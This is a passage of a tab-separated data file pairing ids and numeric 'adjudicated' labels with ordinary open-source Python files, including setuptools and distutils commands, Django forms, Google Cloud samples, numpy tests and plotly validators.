str(fs_root), ""expected \\ separators in windows path""<<NEWL>>    new_folder = Pathy.fluid(fs_root / ""sub-dir"")<<NEWL>>    assert new_folder.exists() is False<<NEWL>>    new_folder.mkdir()<<NEWL>>    assert new_folder.exists() is True<<NEWL>><<NEWL>>    # Make a folder from / absolute path<<NEWL>>    fs_root = Pathy.fluid(f""file://{alt_slashes}"")<<NEWL>>    new_folder = Pathy.fluid(fs_root / ""sub-dir-alt/"")<<NEWL>>    assert new_folder.exists() is False<<NEWL>>    new_folder.mkdir()<<NEWL>>    assert new_folder.exists() is True<<NEWL>><<NEWL>>    shutil.rmtree(tmp_dir)"
12	adjudicated	2	"""""""<<NEWL>>Create a dist_info directory<<NEWL>>As defined in the wheel specification<<NEWL>>""""""<<NEWL>><<NEWL>>import os<<NEWL>>import re<<NEWL>>import warnings<<NEWL>>from inspect import cleandoc<<NEWL>><<NEWL>>from distutils.core import Command<<NEWL>>from distutils import log<<NEWL>>from setuptools.extern import packaging<<NEWL>><<NEWL>><<NEWL>>class dist_info(Command):<<NEWL>><<NEWL>>    description = 'create a .dist-info directory'<<NEWL>><<NEWL>>    user_options = [<<NEWL>>        ('egg-base=', 'e', ""directory containing .egg-info directories""<<NEWL>>                           "" (default: top of the source tree)""),<<NEWL>>    ]<<NEWL>><<NEWL>>    def initialize_options(self):<<NEWL>>        self.egg_base = None<<NEWL>><<NEWL>>    def finalize_options(self):<<NEWL>>        pass<<NEWL>><<NEWL>>    def run(self):<<NEWL>>        egg_info = self.get_finalized_command('egg_info')<<NEWL>>        egg_info.egg_base = self.egg_base<<NEWL>>        egg_info.finalize_options()<<NEWL>>        egg_info.run()<<NEWL>>        name = _safe(self.distribution.get_name())<<NEWL>>        version = _version(self.distribution.get_version())<<NEWL>>        base = self.egg_base or os.curdir<<NEWL>>        dist_info_dir = os.path.join(base, f""{name}-{version}.dist-info"")<<NEWL>>        log.info(""creating '{}'"".format(os.path.abspath(dist_info_dir)))<<NEWL>><<NEWL>>        bdist_wheel = self.get_finalized_command('bdist_wheel')<<NEWL>>        bdist_wheel.egg2dist(egg_info.egg_info, dist_info_dir)<<NEWL>><<NEWL>><<NEWL>>def _safe(component: str) -> str:<<NEWL>>    """"""Escape a component used to form a wheel name according to PEP 491""""""<<NEWL>>    return re.sub(r""[^\w\d.]+"", ""_"", component)<<NEWL>><<NEWL>><<NEWL>>def _version(version: str) -> str:<<NEWL>>    """"""Convert an arbitrary string to a version string.""""""<<NEWL>>    v = version.replace(' ', '.')<<NEWL>>    try:<<NEWL>>        return str(packaging.version.Version(v)).replace(""-"", ""_"")<<NEWL>>    except packaging.version.InvalidVersion:<<NEWL>>        msg = f""""""Invalid version: {version!r}.<<NEWL>>        !!\n\n<<NEWL>>        ###################<<NEWL>>        # Invalid version #<<NEWL>>        ###################<<NEWL>>        {version!r} is not valid according to PEP 440.\n<<NEWL>>        Please make sure specify a valid version for your package.<<NEWL>>        Also note that future releases of setuptools may halt the build process<<NEWL>>        if an invalid version is given.<<NEWL>>        \n\n!!<<NEWL>>        """"""<<NEWL>>        warnings.warn(cleandoc(msg))<<NEWL>>        return _safe(v).strip(""_"")"
383	adjudicated	1	"""""""distutils.command.install_scripts<<NEWL>><<NEWL>>Implements the Distutils 'install_scripts' command, for installing<<NEWL>>Python scripts.""""""<<NEWL>><<NEWL>># contributed by Bastian Kleineidam<<NEWL>><<NEWL>>import os<<NEWL>>from distutils.core import Command<<NEWL>>from distutils import log<<NEWL>>from stat import ST_MODE<<NEWL>><<NEWL>><<NEWL>>class install_scripts(Command):<<NEWL>><<NEWL>>    description = ""install scripts (Python or otherwise)""<<NEWL>><<NEWL>>    user_options = [<<NEWL>>        ('install-dir=', 'd', ""directory to install scripts to""),<<NEWL>>        ('build-dir=', 'b', ""build directory (where to install from)""),<<NEWL>>        ('force', 'f', ""force installation (overwrite existing files)""),<<NEWL>>        ('skip-build', None, ""skip the build steps""),<<NEWL>>    ]<<NEWL>><<NEWL>>    boolean_options = ['force', 'skip-build']<<NEWL>><<NEWL>>    def initialize_options(self):<<NEWL>>        self.install_dir = None<<NEWL>>        self.force = 0<<NEWL>>        self.build_dir = None<<NEWL>>        self.skip_build = None<<NEWL>><<NEWL>>    def finalize_options(self):<<NEWL>>        self.set_undefined_options('build', ('build_scripts', 'build_dir'))<<NEWL>>        self.set_undefined_options(<<NEWL>>            'install',<<NEWL>>            ('install_scripts', 'install_dir'),<<NEWL>>            ('force', 'force'),<<NEWL>>            ('skip_build', 'skip_build'),<<NEWL>>        )<<NEWL>><<NEWL>>    def run(self):<<NEWL>>        if not self.skip_build:<<NEWL>>            self.run_command('build_scripts')<<NEWL>>        self.outfiles = self.copy_tree(self.build_dir, self.install_dir)<<NEWL>>        if os.name == 'posix':<<NEWL>>            # Set the executable bits (owner, group, and world) on<<NEWL>>            # all the scripts we just installed.<<NEWL>>            for file in self.get_outputs():<<NEWL>>                if self.dry_run:<<NEWL>>                    log.info(""changing mode of %s"", file)<<NEWL>>                else:<<NEWL>>                    mode = ((os.stat(file)[ST_MODE]) | 0o555) & 0o7777<<NEWL>>                    log.info(""changing mode of %s to %o"", file, mode)<<NEWL>>                    os.chmod(file, mode)<<NEWL>><<NEWL>>    def get_inputs(self):<<NEWL>>        return self.distribution.scripts or []<<NEWL>><<NEWL>>    def get_outputs(self):<<NEWL>>        return self.outfiles or []"
230	adjudicated	0	"import openai<<NEWL>>import spacy<<NEWL>>from translate import Translator<<NEWL>>from app.ai.WolframeAlpha import WolframAlpha<<NEWL>>from app.models.MongoDb import get_openai_key,get_wolframalpha_key<<NEWL>><<NEWL>>class MicroAI:<<NEWL>>    def __init__(self, api_key):<<NEWL>>        self.api_key = api_key<<NEWL>>        self.nlp = spacy.load(""en_core_web_sm"")<<NEWL>><<NEWL>>    def get_engine(self, question):<<NEWL>>        doc = self.nlp(question)<<NEWL>>        if any(token.text.lower() in ['classify', 'categorize', 'group'] for token in doc):<<NEWL>>            return ""text-davinci-002""<<NEWL>>        elif any(token.text.lower() in ['summarize', 'brief', 'short'] for token in doc):<<NEWL>>            return ""text-davinci-002""<<NEWL>>        elif any(token.text.lower() in ['translate', 'conversion'] for token in doc):<<NEWL>>            return ""text-davinci-002""<<NEWL>>        elif any(token.text.lower() in ['solve', 'calculate', 'compute'] for token in doc):<<NEWL>>            return ""text-davinci-003""<<NEWL>>        elif any(token.text.lower() in ['create', 'build', 'design', 'generate'] for token in doc):<<NEWL>>            return ""davinci-codex""<<NEWL>>        else:<<NEWL>>            return ""text-davinci-002""<<NEWL>><<NEWL>>    def generate_answer(self, question):<<NEWL>>        wolfram = WolframAlpha(app_id=get_wolframalpha_key())<<NEWL>>        answer = wolfram.answer_question(question=question)<<NEWL>>        if ""Lỗi: "" in answer:<<NEWL>>            translator = Translator(to_lang='en', from_lang='vi')<<NEWL>>            question_en = translator.translate(question)<<NEWL>>            engine = self.get_engine(question_en)<<NEWL>><<NEWL>>            openai.api_key = self.api_key<<NEWL>>            completions = openai.Completion.create(<<NEWL>>                engine=engine,<<NEWL>>                prompt=question_en,<<NEWL>>                max_tokens=1024,<<NEWL>>                n=1,<<NEWL>>                stop=None,<<NEWL>>                temperature=0.5,<<NEWL>>            )<<NEWL>>            message = completions.choices[0].text<<NEWL>><<NEWL>>            result = {'engine': engine, 'question': question, 'answer': message}<<NEWL>>            return result<<NEWL>>        else:<<NEWL>>            result = {'engine': 'WolframAlpha', 'question': question, 'answer': answer}<<NEWL>>            return result"
370	adjudicated	2	"# Copyright 2022 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>import os<<NEWL>>import re<<NEWL>>import uuid<<NEWL>><<NEWL>>from google.cloud import iam_v2<<NEWL>>from google.cloud.iam_v2 import types<<NEWL>>import pytest<<NEWL>>from snippets.create_deny_policy import create_deny_policy<<NEWL>>from snippets.delete_deny_policy import delete_deny_policy<<NEWL>><<NEWL>>PROJECT_ID = os.environ[""IAM_PROJECT_ID""]<<NEWL>>GOOGLE_APPLICATION_CREDENTIALS = os.environ[""IAM_CREDENTIALS""]<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture<<NEWL>>def deny_policy(capsys: ""pytest.CaptureFixture[str]"") -> None:<<NEWL>>    policy_id = f""test-deny-policy-{uuid.uuid4()}""<<NEWL>><<NEWL>>    # Delete any existing policies. Otherwise it might throw quota issue.<<NEWL>>    delete_existing_deny_policies(PROJECT_ID, ""test-deny-policy"")<<NEWL>><<NEWL>>    # Create the Deny policy.<<NEWL>>    create_deny_policy(PROJECT_ID, policy_id)<<NEWL>><<NEWL>>    yield policy_id<<NEWL>><<NEWL>>    # Delete the Deny policy and assert if deleted.<<NEWL>>    delete_deny_policy(PROJECT_ID, policy_id)<<NEWL>>    out, _ = capsys.readouterr()<<NEWL>>    assert re.search(f""Deleted the deny policy: {policy_id}"", out)<<NEWL>><<NEWL>><<NEWL>>def delete_existing_deny_policies(project_id: str, delete_name_prefix: str) -> None:<<NEWL>>    policies_client = iam_v2.PoliciesClient()<<NEWL>><<NEWL>>    attachment_point = f""cloudresourcemanager.googleapis.com%2Fprojects%2F{project_id}""<<NEWL>><<NEWL>>    request = types.ListPoliciesRequest()<<NEWL>>    request.parent = f""policies/{attachment_point}/denypolicies""<<NEWL>>    for policy in policies_client.list_policies(request=request):<<NEWL>>        if delete_name_prefix in policy.name:<<NEWL>>            delete_deny_policy(PROJECT_ID, str(policy.name).rsplit(""/"", 1)[-1])"
261	adjudicated	0	"from django.contrib.auth.forms import UserCreationForm<<NEWL>>from django import forms<<NEWL>>from django.contrib.auth.models import User<<NEWL>>from .models import Post<<NEWL>><<NEWL>>class RegisterForm(UserCreationForm):<<NEWL>>    email = forms.EmailField(label = ""Email"")<<NEWL>>    firstname = forms.CharField(label = ""First name"")<<NEWL>>    lastname = forms.CharField(label = ""Last name"")<<NEWL>><<NEWL>>    class Meta:<<NEWL>>        model = User<<NEWL>>        fields = (""username"", ""firstname"", ""lastname"", ""email"", )<<NEWL>><<NEWL>>    def save(self, commit=True):<<NEWL>>        user = super(RegisterForm, self).save(commit=False)<<NEWL>>        firstname = self.cleaned_data[""firstname""]<<NEWL>>        lastname = self.cleaned_data[""lastname""]<<NEWL>>        user.first_name = firstname<<NEWL>>        user.last_name = lastname<<NEWL>>        user.email = self.cleaned_data[""email""]<<NEWL>>        if commit:<<NEWL>>            user.save()<<NEWL>>        return user<<NEWL>>    <<NEWL>>class PostForm(forms.ModelForm):<<NEWL>>    text = forms.CharField(max_length=1000, widget=forms.Textarea(attrs={'placeholder': 'What\'s on your mind?', 'onchange': 'character_count()', 'onkeypress': 'character_count()', 'onfocus': 'character_count()' ,'oninput': 'character_count()', 'onkeyup':'character_count()','onpaste':'character_count()'}))<<NEWL>>    images = forms.ImageField(required=False,widget=forms.ClearableFileInput(attrs={'multiple': True, 'onchange': 'previewImages(this)'}))<<NEWL>>    class Meta:<<NEWL>>        model = Post<<NEWL>>        fields = (""text"", )<<NEWL>><<NEWL>>class SearchForm(forms.Form):<<NEWL>>    search = forms.CharField(max_length=100, widget=forms.TextInput(attrs={'placeholder': 'Type something or someone to search for ...'}))<<NEWL>><<NEWL>>class UpdateProfileForm(forms.Form):<<NEWL>>    first_name = forms.CharField(max_length=100, required=False)<<NEWL>>    last_name = forms.CharField(max_length=100, required=False)<<NEWL>>    profile_image = forms.ImageField(required=False)<<NEWL>>    remove_profile_image = forms.BooleanField(required=False)<<NEWL>>    profile_cover_photo = forms.ImageField(required=False)<<NEWL>>    remove_cover_photo = forms.BooleanField(required=False)<<NEWL>>    profile_bio = forms.CharField(max_length=500, required=False, widget=forms.Textarea(attrs={'placeholder': 'Write something about yourself ...'}))"
321	adjudicated	3	"# Copyright (c) Facebook, Inc. and its affiliates.<<NEWL>>#<<NEWL>># This source code is licensed under the MIT license found in the<<NEWL>># LICENSE file in the root directory of this source tree.<<NEWL>><<NEWL>>from fairseq.optim import LegacyFairseqOptimizer, register_optimizer<<NEWL>><<NEWL>><<NEWL>>@register_optimizer(""lamb"")<<NEWL>>class FairseqLAMB(LegacyFairseqOptimizer):<<NEWL>>    """"""LAMB optimizer.""""""<<NEWL>><<NEWL>>    def __init__(self, args, params):<<NEWL>>        super().__init__(args)<<NEWL>>        try:<<NEWL>>            from apex.optimizers import FusedLAMB<<NEWL>><<NEWL>>            self._optimizer = FusedLAMB(params, **self.optimizer_config)<<NEWL>>        except ImportError:<<NEWL>>            raise ImportError(""Please install apex to use LAMB optimizer"")<<NEWL>><<NEWL>>    @staticmethod<<NEWL>>    def add_args(parser):<<NEWL>>        """"""Add optimizer-specific arguments to the parser.""""""<<NEWL>>        # fmt: off<<NEWL>>        parser.add_argument('--lamb-betas', default='(0.9, 0.999)', metavar='B',<<NEWL>>                            help='betas for LAMB optimizer')<<NEWL>>        parser.add_argument('--lamb-eps', type=float, default=1e-8, metavar='D',<<NEWL>>                            help='epsilon for LAMB optimizer')<<NEWL>>        parser.add_argument('--weight-decay', '--wd', default=0.0, type=float, metavar='WD',<<NEWL>>                            help='weight decay')<<NEWL>>        # fmt: on<<NEWL>><<NEWL>>    @property<<NEWL>>    def optimizer_config(self):<<NEWL>>        """"""<<NEWL>>        Return a kwarg dictionary that will be used to override optimizer<<NEWL>>        args stored in checkpoints. This allows us to load a checkpoint and<<NEWL>>        resume training using a different set of optimizer args, e.g., with a<<NEWL>>        different learning rate.<<NEWL>>        """"""<<NEWL>>        return {<<NEWL>>            ""lr"": self.args.lr[0],<<NEWL>>            ""betas"": eval(self.args.lamb_betas),<<NEWL>>            ""eps"": self.args.lamb_eps,<<NEWL>>            ""weight_decay"": self.args.weight_decay,<<NEWL>>        }<<NEWL>><<NEWL>>    @property<<NEWL>>    def supports_flat_params(self):<<NEWL>>        return False"
330	adjudicated	0	"""""""Tests for the NumpyVersion class.<<NEWL>><<NEWL>>""""""<<NEWL>>from numpy.testing import assert_, assert_raises<<NEWL>>from numpy.lib import NumpyVersion<<NEWL>><<NEWL>><<NEWL>>def test_main_versions():<<NEWL>>    assert_(NumpyVersion('1.8.0') == '1.8.0')<<NEWL>>    for ver in ['1.9.0', '2.0.0', '1.8.1', '10.0.1']:<<NEWL>>        assert_(NumpyVersion('1.8.0') < ver)<<NEWL>><<NEWL>>    for ver in ['1.7.0', '1.7.1', '0.9.9']:<<NEWL>>        assert_(NumpyVersion('1.8.0') > ver)<<NEWL>><<NEWL>><<NEWL>>def test_version_1_point_10():<<NEWL>>    # regression test for gh-2998.<<NEWL>>    assert_(NumpyVersion('1.9.0') < '1.10.0')<<NEWL>>    assert_(NumpyVersion('1.11.0') < '1.11.1')<<NEWL>>    assert_(NumpyVersion('1.11.0') == '1.11.0')<<NEWL>>    assert_(NumpyVersion('1.99.11') < '1.99.12')<<NEWL>><<NEWL>><<NEWL>>def test_alpha_beta_rc():<<NEWL>>    assert_(NumpyVersion('1.8.0rc1') == '1.8.0rc1')<<NEWL>>    for ver in ['1.8.0', '1.8.0rc2']:<<NEWL>>        assert_(NumpyVersion('1.8.0rc1') < ver)<<NEWL>><<NEWL>>    for ver in ['1.8.0a2', '1.8.0b3', '1.7.2rc4']:<<NEWL>>        assert_(NumpyVersion('1.8.0rc1') > ver)<<NEWL>><<NEWL>>    assert_(NumpyVersion('1.8.0b1') > '1.8.0a2')<<NEWL>><<NEWL>><<NEWL>>def test_dev_version():<<NEWL>>    assert_(NumpyVersion('1.9.0.dev-Unknown') < '1.9.0')<<NEWL>>    for ver in ['1.9.0', '1.9.0a1', '1.9.0b2', '1.9.0b2.dev-ffffffff']:<<NEWL>>        assert_(NumpyVersion('1.9.0.dev-f16acvda') < ver)<<NEWL>><<NEWL>>    assert_(NumpyVersion('1.9.0.dev-f16acvda') == '1.9.0.dev-11111111')<<NEWL>><<NEWL>><<NEWL>>def test_dev_a_b_rc_mixed():<<NEWL>>    assert_(NumpyVersion('1.9.0a2.dev-f16acvda') == '1.9.0a2.dev-11111111')<<NEWL>>    assert_(NumpyVersion('1.9.0a2.dev-6acvda54') < '1.9.0a2')<<NEWL>><<NEWL>><<NEWL>>def test_dev0_version():<<NEWL>>    assert_(NumpyVersion('1.9.0.dev0+Unknown') < '1.9.0')<<NEWL>>    for ver in ['1.9.0', '1.9.0a1', '1.9.0b2', '1.9.0b2.dev0+ffffffff']:<<NEWL>>        assert_(NumpyVersion('1.9.0.dev0+f16acvda') < ver)<<NEWL>><<NEWL>>    assert_(NumpyVersion('1.9.0.dev0+f16acvda') == '1.9.0.dev0+11111111')<<NEWL>><<NEWL>><<NEWL>>def test_dev0_a_b_rc_mixed():<<NEWL>>    assert_(NumpyVersion('1.9.0a2.dev0+f16acvda') == '1.9.0a2.dev0+11111111')<<NEWL>>    assert_(NumpyVersion('1.9.0a2.dev0+6acvda54') < '1.9.0a2')<<NEWL>><<NEWL>><<NEWL>>def test_raises():<<NEWL>>    for ver in ['1.9', '1,9.0', '1.7.x']:<<NEWL>>        assert_raises(ValueError, NumpyVersion, ver)"
270	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class FontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(<<NEWL>>        self, plotly_name=""font"", parent_name=""funnelarea.hoverlabel"", **kwargs<<NEWL>>    ):<<NEWL>>        super(FontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Font""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
361	adjudicated	3	"#!/usr/bin/env python<<NEWL>><<NEWL>># Copyright 2021 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#     http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>># [START privateca_disable_ca]<<NEWL>>import google.cloud.security.privateca_v1 as privateca_v1<<NEWL>><<NEWL>><<NEWL>>def disable_certificate_authority(<<NEWL>>    project_id: str, location: str, ca_pool_name: str, ca_name: str<<NEWL>>) -> None:<<NEWL>>    """"""<<NEWL>>    Disable a Certificate Authority which is present in the given CA pool.<<NEWL>><<NEWL>>    Args:<<NEWL>>        project_id: project ID or project number of the Cloud project you want to use.<<NEWL>>        location: location you want to use. For a list of locations, see: https://cloud.google.com/certificate-authority-service/docs/locations.<<NEWL>>        ca_pool_name: the name of the CA pool under which the CA is present.<<NEWL>>        ca_name: the name of the CA to be disabled.<<NEWL>>    """"""<<NEWL>><<NEWL>>    caServiceClient = privateca_v1.CertificateAuthorityServiceClient()<<NEWL>>    ca_path = caServiceClient.certificate_authority_path(<<NEWL>>        project_id, location, ca_pool_name, ca_name<<NEWL>>    )<<NEWL>><<NEWL>>    # Create the Disable Certificate Authority Request.<<NEWL>>    request = privateca_v1.DisableCertificateAuthorityRequest(name=ca_path)<<NEWL>><<NEWL>>    # Disable the Certificate Authority.<<NEWL>>    operation = caServiceClient.disable_certificate_authority(request=request)<<NEWL>>    result = operation.result()<<NEWL>><<NEWL>>    print(""Operation result:"", result)<<NEWL>><<NEWL>>    # Get the current CA state.<<NEWL>>    ca_state = caServiceClient.get_certificate_authority(name=ca_path).state<<NEWL>><<NEWL>>    # Check if the CA is disabled.<<NEWL>>    if ca_state == privateca_v1.CertificateAuthority.State.DISABLED:<<NEWL>>        print(""Disabled Certificate Authority:"", ca_name)<<NEWL>>    else:<<NEWL>>        print(""Cannot disable the Certificate Authority ! Current CA State:"", ca_state)<<NEWL>><<NEWL>><<NEWL>># [END privateca_disable_ca]"
221	adjudicated	0	"from viktor._vendor import libcst<<NEWL>><<NEWL>>from viktor._vendor.libcst import matchers as m<<NEWL>><<NEWL>>from viktor._codemod.helpers import match_controller_class<<NEWL>><<NEWL>><<NEWL>>class Visitor(libcst.CSTVisitor):<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>class Transformer(libcst.CSTTransformer):<<NEWL>><<NEWL>>    def __init__(self, visitor):<<NEWL>>        super().__init__()<<NEWL>><<NEWL>>        self.OptionField_ImportAlias = None<<NEWL>><<NEWL>>    def leave_ImportAlias_asname(self, node) -> None:<<NEWL>>        if node.name.value == ""OptionField"":<<NEWL>>            if node.asname:<<NEWL>>                self.OptionField_ImportAlias = node.asname.name.value<<NEWL>><<NEWL>>    def leave_ClassDef(self, original_node, updated_node):<<NEWL>><<NEWL>>        if not match_controller_class(original_node):<<NEWL>>            return updated_node<<NEWL>><<NEWL>>        body = updated_node.body<<NEWL>>        new_statements = []<<NEWL>>        for statement in body.body:<<NEWL>>            if m.matches(statement, m.SimpleStatementLine()):<<NEWL>>                try:<<NEWL>>                    target = statement.body[0].targets[0].target<<NEWL>>                    if target.value.startswith('viktor_'):<<NEWL>>                        continue<<NEWL>>                except AttributeError:  # 'targets' not present<<NEWL>>                    pass<<NEWL>><<NEWL>>            new_statements.append(statement)<<NEWL>><<NEWL>>        body = body.with_changes(body=new_statements)<<NEWL>><<NEWL>>        return updated_node.with_changes(body=body)<<NEWL>><<NEWL>>    def leave_Call(self, node, updated_node):<<NEWL>><<NEWL>>        try:<<NEWL>>            if node.func.value not in (self.OptionField_ImportAlias, ""OptionField""):<<NEWL>>                return updated_node<<NEWL>>        except AttributeError:  # func may not have 'value'<<NEWL>>            return updated_node<<NEWL>><<NEWL>>        new_args = []<<NEWL>>        for arg_index, arg in enumerate(node.args):<<NEWL>><<NEWL>>            if arg.keyword is not None:<<NEWL>>                if arg.keyword.value == 'autoselect_single_option' and arg.value.value == 'False':<<NEWL>>                    continue<<NEWL>>            new_args.append(arg)<<NEWL>><<NEWL>>        new_args[-1] = new_args[-1].with_changes(comma=None)<<NEWL>><<NEWL>>        return updated_node.with_changes(args=new_args)"
3	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class FontValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""font"", parent_name=""funnelarea.title"", **kwargs):<<NEWL>>        super(FontValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Font""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            color<<NEWL>><<NEWL>>            colorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `color`.<<NEWL>>            family<<NEWL>>                HTML font family - the typeface that will be<<NEWL>>                applied by the web browser. The web browser<<NEWL>>                will only be able to apply a font if it is<<NEWL>>                available on the system which it operates.<<NEWL>>                Provide multiple font families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
392	adjudicated	1	"from django.core import checks<<NEWL>><<NEWL>>NOT_PROVIDED = object()<<NEWL>><<NEWL>><<NEWL>>class FieldCacheMixin:<<NEWL>>    """"""Provide an API for working with the model's fields value cache.""""""<<NEWL>><<NEWL>>    def get_cache_name(self):<<NEWL>>        raise NotImplementedError<<NEWL>><<NEWL>>    def get_cached_value(self, instance, default=NOT_PROVIDED):<<NEWL>>        cache_name = self.get_cache_name()<<NEWL>>        try:<<NEWL>>            return instance._state.fields_cache[cache_name]<<NEWL>>        except KeyError:<<NEWL>>            if default is NOT_PROVIDED:<<NEWL>>                raise<<NEWL>>            return default<<NEWL>><<NEWL>>    def is_cached(self, instance):<<NEWL>>        return self.get_cache_name() in instance._state.fields_cache<<NEWL>><<NEWL>>    def set_cached_value(self, instance, value):<<NEWL>>        instance._state.fields_cache[self.get_cache_name()] = value<<NEWL>><<NEWL>>    def delete_cached_value(self, instance):<<NEWL>>        del instance._state.fields_cache[self.get_cache_name()]<<NEWL>><<NEWL>><<NEWL>>class CheckFieldDefaultMixin:<<NEWL>>    _default_hint = (""<valid default>"", ""<invalid default>"")<<NEWL>><<NEWL>>    def _check_default(self):<<NEWL>>        if (<<NEWL>>            self.has_default()<<NEWL>>            and self.default is not None<<NEWL>>            and not callable(self.default)<<NEWL>>        ):<<NEWL>>            return [<<NEWL>>                checks.Warning(<<NEWL>>                    ""%s default should be a callable instead of an instance ""<<NEWL>>                    ""so that it's not shared between all field instances.""<<NEWL>>                    % (self.__class__.__name__,),<<NEWL>>                    hint=(<<NEWL>>                        ""Use a callable instead, e.g., use `%s` instead of ""<<NEWL>>                        ""`%s`."" % self._default_hint<<NEWL>>                    ),<<NEWL>>                    obj=self,<<NEWL>>                    id=""fields.E010"",<<NEWL>>                )<<NEWL>>            ]<<NEWL>>        else:<<NEWL>>            return []<<NEWL>><<NEWL>>    def check(self, **kwargs):<<NEWL>>        errors = super().check(**kwargs)<<NEWL>>        errors.extend(self._check_default())<<NEWL>>        return errors"
143	adjudicated	0	"#<<NEWL>># Licensed to the Apache Software Foundation (ASF) under one<<NEWL>># or more contributor license agreements.  See the NOTICE file<<NEWL>># distributed with this work for additional information<<NEWL>># regarding copyright ownership.  The ASF licenses this file<<NEWL>># to you under the Apache License, Version 2.0 (the<<NEWL>># ""License""); you may not use this file except in compliance<<NEWL>># with the License.  You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#   http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing,<<NEWL>># software distributed under the License is distributed on an<<NEWL>># ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY<<NEWL>># KIND, either express or implied.  See the License for the<<NEWL>># specific language governing permissions and limitations<<NEWL>># under the License.<<NEWL>>from __future__ import annotations<<NEWL>><<NEWL>>import os<<NEWL>><<NEWL>>import pytest<<NEWL>><<NEWL>>from tests.providers.google.cloud.utils.gcp_authenticator import GCP_DATASTORE_KEY<<NEWL>>from tests.test_utils.gcp_system_helpers import CLOUD_DAG_FOLDER, GoogleSystemTest, provide_gcp_context<<NEWL>><<NEWL>>BUCKET = os.environ.get(""GCP_DATASTORE_BUCKET"", ""datastore-system-test"")<<NEWL>><<NEWL>><<NEWL>>@pytest.mark.backend(""mysql"", ""postgres"")<<NEWL>>@pytest.mark.credential_file(GCP_DATASTORE_KEY)<<NEWL>>class TestGcpDatastoreSystem(GoogleSystemTest):<<NEWL>>    @provide_gcp_context(GCP_DATASTORE_KEY)<<NEWL>>    def setup_method(self):<<NEWL>>        self.create_gcs_bucket(BUCKET, location=""europe-central2"")<<NEWL>><<NEWL>>    @provide_gcp_context(GCP_DATASTORE_KEY)<<NEWL>>    def teardown_method(self):<<NEWL>>        self.delete_gcs_bucket(BUCKET)<<NEWL>><<NEWL>>    